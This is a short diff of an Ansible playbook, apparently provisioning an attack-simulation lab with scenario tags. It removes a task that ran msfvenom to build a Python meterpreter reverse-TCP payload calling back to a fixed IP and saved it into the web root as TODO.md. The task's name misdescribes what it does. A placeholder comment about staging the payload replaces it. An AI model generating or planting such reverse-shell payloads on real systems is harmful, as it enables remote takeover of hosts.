@@ -204,14 +204,7 @@
       tags:
           - playbooks
 
-    - name: Create file with add-key-to-root-authorize-command
-      ansible.builtin.shell:
-              cmd: msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=192.42.1.174 --platform x64 > /var/www/html/TODO.md
-              creates: /var/www/html/TODO.md
-      tags:
-          - playbooks
-          - scenario_1_e_a
-          - scenario_1_c_a
+    # TODO: Stage the payload
 
     - name: Copy playbooks
       become: True
